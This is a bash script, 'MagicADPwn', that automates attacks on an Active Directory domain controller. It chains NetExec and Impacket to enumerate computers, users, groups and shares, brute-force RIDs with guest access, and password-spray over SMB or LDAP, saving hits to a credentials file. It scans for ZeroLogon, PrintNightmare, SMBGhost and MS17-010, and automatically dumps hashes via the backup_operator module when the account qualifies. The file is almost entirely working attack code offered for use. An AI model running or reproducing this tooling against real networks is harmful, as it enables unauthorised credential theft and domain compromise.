#!/usr/bin/env bash

# MagicADPwn - Automated Active Directory enumeration and exploitation tool

# Define directories
BASE_DIR="$HOME/.magicadpwn"
LOG_DIR="$BASE_DIR/logs"
REPORT_DIR="$BASE_DIR/reports"

# --- Helper Functions --- #

# Function to ensure a directory exists
ensure_dir_exists() {
  local dir="$1"
  if [[ ! -d "$dir" ]]; then
    mkdir -p "$dir" || {
      print_error "Failed to create directory: $dir. Check permissions."
      exit 1
    }
  fi
}

print_banner() {
  echo -e "\n${BLUE}==============================${RESET}"
  echo -e "${GREEN}       MagicADPwn v1.0       ${RESET}"
  echo -e "${BLUE}==============================${RESET}\n"
}

print_section() {
  local title="$1"
  local padding=4  # 2 spaces on each side
  local total_length=$(( ${#title} + padding ))
  local border
  border=$(printf '%*s' "$total_length" | tr ' ' '=')
  
  echo -e "\n${BLUE}${border}${RESET}"
  echo -e "${BLUE}= ${GREEN}${title}${BLUE} =${RESET}"
  echo -e "${BLUE}${border}${RESET}"
}

print_info() {
  local msg="$1"
  echo -e "${GREEN}[INFO]${RESET} ${msg}"
}

print_warning() {
  local msg="$1"
  echo -e "${RED}[WARNING]${RESET} ${msg}"
}

print_error() {
  local msg="$1"
  echo -e "${RED}[ERROR]${RESET} ${msg}"
}

# --- End Helper Functions --- #

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Ensure necessary directories exist
ensure_dir_exists "$BASE_DIR"
ensure_dir_exists "$LOG_DIR"
ensure_dir_exists "$REPORT_DIR"

# Print the banner
print_banner

# Usage function
usage() {
  cat <<EOF
MagicADPwn - Automated AD Enumeration & Exploitation

Usage: $0 -t <target_ip/hostname> [-u <username>] [-p <password> | -H <hash> | -k [--no-pass]] [--local-auth] [-v]

Required:
  -t, --target       Target Domain Controller IP/hostname

Optional:
  -u, --user         Username (default: guest/anonymous)
  -p, --pass         Password
  -H, --hash         NTLM hash
  -k, --kerberos     Use Kerberos authentication
      --no-pass      Skip password/hash when using Kerberos
      --local-auth   Use local authentication
  --no-recon         Skip reconnaissance phase
  --report <format>  Generate report (json, csv, markdown, html)
  -v, --verbose      Enable verbose output

EOF
  exit 0
}

# --- Parse Arguments --- #
if [[ "$#" -eq 0 ]]; then
  usage
fi

TARGET=""
DOMAIN=""
DOMAIN_DIR=""
USERNAME=""
PASSWORD=""
NTLM_HASH=""
KERBEROS=false
NO_PASS=false
LOCAL_AUTH=false
NO_RECON=false
REPORT_FORMAT=""
VERBOSE=false

while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -t|--target)
      TARGET="$2"
      shift 2
      ;;
    -u|--user)
      USERNAME="$2"
      shift 2
      ;;
    -p|--pass)
      PASSWORD="$2"
      shift 2
      ;;
    -H|--hash)
      NTLM_HASH="$2"
      shift 2
      ;;
    -k|--kerberos)
      KERBEROS=true
      shift
      ;;
    --no-pass)
      NO_PASS=true
      shift
      ;;
    --local-auth)
      LOCAL_AUTH=true
      shift
      ;;
    --no-recon)
      NO_RECON=true
      shift
      ;;
    --report)
      REPORT_FORMAT="$2"
      shift 2
      ;;
    -v|--verbose)
      VERBOSE=true
      shift
      ;;
    -h|--help)
      usage
      ;;
    *)
      print_error "Unknown option: $1"
      usage
      ;;
  esac
done

if [[ -z "$TARGET" ]]; then
  print_error "Target (-t) is required."
  usage
  exit 1
fi

if [[ -z "$USERNAME" ]]; then
  print_info "No username provided, attempting guest/anonymous authentication."
  USERNAME="guest"
fi

if [[ -z "$PASSWORD" ]]; then
  PASSWORD=""
  NO_PASS=true
fi

if [[ "$NO_PASS" == true ]]; then
  PASSWORD=""
fi

# --- Functions for Enumeration and Exploitation --- #

check_target_reachable() {
  local target="$1"
  if [[ -z "$target" ]]; then
    print_error "No target specified for reachability check."
    exit 1
  fi

  local ports=(445 389)
  for port in "${ports[@]}"; do
    if timeout 1 bash -c "echo >/dev/tcp/${target}/${port}" 2>/dev/null; then
      print_info "Target ${target} is reachable on port ${port}."
      return 0
    fi
  done

  print_error "Target ${target} is not reachable on ports ${ports[*]}."
  print_error "Exiting..."
  exit 1
}

check_port() {
  local target="$1"
  local port="$2"
  timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && return 0 || return 1
}

generate_hosts_file() {
  local target="$1"
  if [[ -z "$target" ]]; then
    print_error "No target specified for generating hosts file."
    return 1
  fi

  print_section "Generating Hosts File"
  print_info "Generating hosts file for target ${target}..."
  local tmpfile
  tmpfile=$(mktemp) || { print_error "Failed to create temporary file."; return 1; }

  if nxc smb "$target" --generate-hosts-file "$tmpfile"; then
    print_info "Appending new hosts entries to /etc/hosts..."
    while IFS= read -r line; do
      [[ -z "$line" ]] && continue
      if ! grep -Fxq "$line" /etc/hosts; then
        echo "$line" >> /etc/hosts
        print_info "Added: $line"
      else
        print_info "Already exists: $line"
      fi
    done < "$tmpfile"
    rm "$tmpfile"
    print_info "/etc/hosts updated successfully."
  else
    print_error "nxc smb failed to generate hosts file for $target."
    rm "$tmpfile"
    return 1
  fi
}

get_domain() {
  local target="$1"
  if [[ -z "$target" ]]; then
    echo "No target specified for domain extraction." >&2
    return 1
  fi

  local output
  output=$(nxc smb "$target" 2>/dev/null)
  if [[ -z "$output" ]]; then
    echo "No output received from nxc smb for ${target}." >&2
    return 1
  fi

  local domain
  domain=$(echo "$output" | grep -oP "\(domain:\K[^)]+")
  if [[ -z "$domain" ]]; then
    echo "Could not extract domain from nxc smb output." >&2
    return 1
  fi

  echo "$domain"
}

enumerate_computers() {
  local target="$1"  # Target DC's IP address
  local user="$2"
  local pass="$3"
  local hash="$4"
  local kerberos="$5"

  if [[ -z "$DOMAIN" ]]; then
    DOMAIN=$(get_domain "$target")
    if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
      print_error "Unable to retrieve domain name from $target. Please specify DOMAIN manually."
      exit 1
    else
      print_info "Retrieved domain: $DOMAIN"
    fi
  fi

  local pos_arg="$DOMAIN"
  if [[ -n "$user" ]]; then
    pos_arg+="/$user"
    if [[ -n "$pass" && -z "$hash" ]]; then
      pos_arg+=":$pass"
    fi
  fi

  local cmd="GetADComputers.py -dc-ip ${target}"
  [[ "$NO_PASS" == true ]] && cmd+=" -no-pass"
  [[ -n "$hash" ]] && cmd+=" -hashes :$hash"
  [[ "$kerberos" == "true" ]] && cmd+=" -k"
  cmd+=" $pos_arg"

  print_section "Enumerating Computers on Active Directory"
  print_info "Running: $cmd"
  local output
  output=$(eval "$cmd" 2>&1 | tr -d '\0')
  if echo "$output" | grep -q "Error in searchRequest"; then
    print_warning "GetADComputers.py failed with a bind error."
    return
  fi
}

enumerate_users() {
  local target="$1"  # target DC's IP address
  local user="$2"
  local pass="$3"
  local hash="$4"
  local kerberos="$5"

  if [[ -z "$DOMAIN" ]]; then
    DOMAIN=$(get_domain "$target")
    if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
      print_error "Unable to retrieve domain name from $target. Please specify DOMAIN manually."
      exit 1
    else
      print_info "Retrieved domain: $DOMAIN"
    fi
  fi

  print_section "Enumerating Users on Active Directory"
  local pos_arg="$DOMAIN"
  if [[ -n "$user" ]]; then
    pos_arg+="/$user"
    if [[ -n "$pass" && -z "$hash" ]]; then
      pos_arg+=":$pass"
    fi
  fi

  local cmd="GetADUsers.py -all -dc-ip ${target}"
  [[ "$NO_PASS" == true ]] && cmd+=" -no-pass" || { [[ -n "$pass" ]] && cmd+=" -p \"$pass\""; }
  [[ -n "$hash" ]] && cmd+=" -hashes :$hash"
  [[ "$kerberos" == "true" ]] && cmd+=" -k"
  cmd+=" $pos_arg"

  print_info "Running: $cmd"
  local output
  output=$(eval "$cmd" 2>&1 | tr -d '\0')
  if echo "$output" | grep -q "Error in searchRequest"; then
    print_warning "GetADUsers.py failed with a bind error. Falling back to RID brute method..."
    enumerate_users_alternative "$target"
    return
  fi

  # Write the output to a file in the domain subfolder
  echo "$output" | grep -vE '^(Impacket|\[\*|Name|-------------------)' | awk 'NF {print $1}' | sed '/^$/d' > "$DOMAIN_DIR/users.txt"
  print_info "User list saved to $DOMAIN_DIR/users.txt"
  print_section "User List"
  cat "$DOMAIN_DIR/users.txt"
}

enumerate_users_alternative() {
  local target="$1"  # target DC's IP address
  print_section "RID Brute User Enumeration"
  print_info "Running RID brute user enumeration with nxc smb..."
  
  nxc smb "$target" -u guest -p "" --rid-brute 20000 | \
    grep -oP '(?<=\\)[A-Za-z0-9._-]+' | sed 's/:$//' | sort -u | \
    grep -v -E '^(Domain|Enterprise|krbtgt|Cert|Schema|Group|Read-only|Cloneable|Protected|Key|RAS|Allowed|Denied|DC\$|DnsAdmins|DnsUpdateProxy)$' > "$DOMAIN_DIR/users.txt"
  
  if [[ -s "$DOMAIN_DIR/users.txt" ]]; then
    print_info "User list retrieved via RID brute and saved to $DOMAIN_DIR/users.txt"
    print_section "User List"
    cat "$DOMAIN_DIR/users.txt"
  else
    print_error "RID brute alternative method failed. No users retrieved."
  fi
}

enumerate_groups() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local groups_file="$DOMAIN_DIR/groups.txt"
  
  print_section "Enumerating Groups on Active Directory"
  local cmd="nxc smb \"$target\" --groups"
  [[ -n "$user" ]] && cmd+=" -u \"$user\""
  if [[ "$NO_PASS" == true ]]; then
    cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
  
  print_info "Running: $cmd"
  eval "$cmd" | tee "$groups_file"
  print_info "Group enumeration results saved to $groups_file"
}

password_spray() {
  local target="$1"
  local users="$2"
  local passwords="$3"
  local creds_file="$DOMAIN_DIR/creds.txt"
  
  print_section "Password Spraying"
  print_info "Checking available authentication services on $target..."
  
  if check_port "$target" 445; then
    print_info "SMB (port 445) is open. Using SMB for authentication attempts."
    if [[ -n "$users" && -n "$passwords" ]]; then
      nxc smb "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$users" ]]; then
      if [[ "$NO_PASS" == true ]]; then
        nxc smb "$target" -u "$users" -p "" --continue-on-success | grep [+] | tee -a "$creds_file"
      else
        nxc smb "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
      fi
    elif [[ -n "$passwords" ]]; then
      nxc smb "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    fi
  elif check_port "$target" 389; then
    print_info "LDAP (port 389) is open. Using LDAP for authentication attempts."
    if [[ -n "$users" && -n "$passwords" ]]; then
      nxc ldap "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    elif [[ -n "$users" ]]; then
      if [[ "$NO_PASS" == true ]]; then
        nxc ldap "$target" -u "$users" -p "" --continue-on-success | grep [+] | tee -a "$creds_file"
      else
        nxc ldap "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
      fi
    elif [[ -n "$passwords" ]]; then
      nxc ldap "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
    fi
  else
    print_error "Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
    return 1
  fi
}

scan_vulnerabilities() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local vuln_file="$DOMAIN_DIR/vulnerabilities.txt"

  print_section "Vulnerability Scanning"
  local cmd="nxc smb \"$target\" -M zerologon -M printnightmare -M smbghost -M ms17-010"
  [[ -n "$user" ]] && cmd+=" -u \"$user\""
  if [[ "$NO_PASS" == true ]]; then
    cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
  
  print_info "Running: $cmd"
  eval "$cmd" | tee "$vuln_file"
  print_info "Vulnerability scan results saved to $vuln_file"
}

dump_user_descriptions() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local desc_file="$DOMAIN_DIR/user_descriptions.txt"
  
  print_section "Dumping User Descriptions"
  local cmd="nxc ldap \"$target\" -M get-desc-users"
  [[ -n "$user" ]] && cmd+=" -u \"$user\""
  if [[ "$NO_PASS" == true ]]; then
    cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
  
  print_info "Running: $cmd"
  local output
  output=$(eval "$cmd" 2>&1 | tr -d '\0')
  
  if echo "$output" | grep -q "Error in searchRequest"; then
    print_warning "Dumping user descriptions failed with a bind error."
  else
    echo "$output" | tee "$desc_file"
    print_info "User descriptions saved to $desc_file"
  fi
}

enumerate_smb_shares() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local shares_file="$DOMAIN_DIR/smb_shares.txt"
  
  print_section "Enumerating SMB Shares"
  local cmd="nxc smb \"$target\" --shares --filter-shares READ WRITE"
  [[ -n "$user" ]] && cmd+=" -u \"$user\""
  if [[ "$NO_PASS" == true ]]; then
    cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  [[ -n "$hash" ]] && cmd+=" -H \"$hash\""
  
  print_info "Running: $cmd"
  eval "$cmd" | tee "$shares_file"
  print_info "SMB share enumeration results saved to $shares_file"
}

enumerate_readable_files() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local files_file="$DOMAIN_DIR/readable_files.txt"
  
  print_section "Enumerating Readable Files"
  
  # Build the spider command using spider_plus with an exclude filter.
  local spider_cmd="nxc smb \"$target\" -M spider_plus"
  [[ -n "$user" ]] && spider_cmd+=" -u \"$user\""
  if [[ "$NO_PASS" == true ]]; then
    spider_cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    spider_cmd+=" -p \"$pass\""
  fi
  [[ -n "$hash" ]] && spider_cmd+=" -H \"$hash\""
  # Use the -o option to exclude unwanted shares (ADMIN$, C$, print$, IPC$)
  spider_cmd+=" -o 'EXCLUDE_FILTER=admin\$, c\$, print\$, ipc\$'"
  
  print_info "Running: $spider_cmd"
  local output
  output=$(eval "$spider_cmd" 2>&1)
  
  echo "$output" > "$files_file"
  print_info "Readable files spidering complete. Results saved to $files_file"
  
  # Attempt to extract the JSON metadata file path and pretty-print with jq
  local json_file
  json_file=$(echo "$output" | grep -oP '(?<=Saved share-file metadata to ")[^"]+')
  if [[ -n "$json_file" && -f "$json_file" ]]; then
    print_section "Spider JSON Output"
    cat "$json_file" | jq
  fi
}

analyze_group_membership() {
  local membership_file="$1"
  local target="$2"
  local user="$3"
  local pass="$4"
  local hash="$5"

  if grep -qi "Remote Management Users" "$membership_file"; then
    print_info "Hint: The user is a member of 'Remote Management Users'. Check if WinRM (TCP port 5985) or RDP (TCP port 3389) is open for interactive connection."
  fi

  if grep -qi "Backup Operators" "$membership_file"; then
    print_info "User is a member of 'Backup Operators'. Automatically running backup_operator module to dump hashes..."
    local backup_cmd="nxc smb \"$target\" -u \"$user\""
    if [[ "$NO_PASS" == true ]]; then
      backup_cmd+=" -p \"\""
    elif [[ -n "$pass" ]]; then
      backup_cmd+=" -p \"$pass\""
    fi
    if [[ -n "$hash" ]]; then
      backup_cmd+=" -H \"$hash\""
    fi
    backup_cmd+=" -M backup_operator"
    print_info "Running: $backup_cmd"
    eval "$backup_cmd"
  fi
}

enumerate_groupmembership() {
  local target="$1"
  local user="$2"
  local pass="$3"
  local hash="$4"
  local membership_file="$DOMAIN_DIR/groupmembership.txt"
  
  print_section "Enumerating Groups on Active Directory"
  local cmd="nxc ldap \"$target\" -M groupmembership -o USER=\"$user\""
  if [[ "$NO_PASS" == true ]]; then
    cmd+=" -p \"\""
  elif [[ -n "$pass" ]]; then
    cmd+=" -p \"$pass\""
  fi
  if [[ -n "$hash" ]]; then
    cmd+=" -H \"$hash\""
  fi
  
  print_info "Running: $cmd"
  eval "$cmd" 2>&1 | tee "$membership_file"
  print_info "Group membership results saved to $membership_file"
  
  analyze_group_membership "$membership_file" "$target" "$user" "$pass" "$hash"
}

# --- Main Logic --- #

if [[ -z "$TARGET" ]]; then
  print_error "Target (-t) is required."
  usage
  exit 1
fi

print_info "Starting MagicADPwn on $TARGET"
check_target_reachable "$TARGET"
generate_hosts_file "$TARGET"

# Dynamically retrieve the domain name and print it
DOMAIN=$(get_domain "$TARGET")
if [[ $? -ne 0 || -z "$DOMAIN" ]]; then
  print_error "Failed to retrieve domain from $TARGET."
  exit 1
fi
print_info "Retrieved domain: ${DOMAIN}"

# Create a subfolder for this domain
DOMAIN_DIR="$BASE_DIR/$DOMAIN"
ensure_dir_exists "$DOMAIN_DIR"
print_info "Created domain directory: $DOMAIN_DIR"

enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
enumerate_users "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
enumerate_groups "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
scan_vulnerabilities "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
dump_user_descriptions "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
enumerate_smb_shares "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"

# disable for now due to issues with spider_plus
#enumerate_readable_files "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
enumerate_groupmembership "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH"

if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
  password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
  exit 0
fi

# Additional enumeration and exploitation logic can be added here.
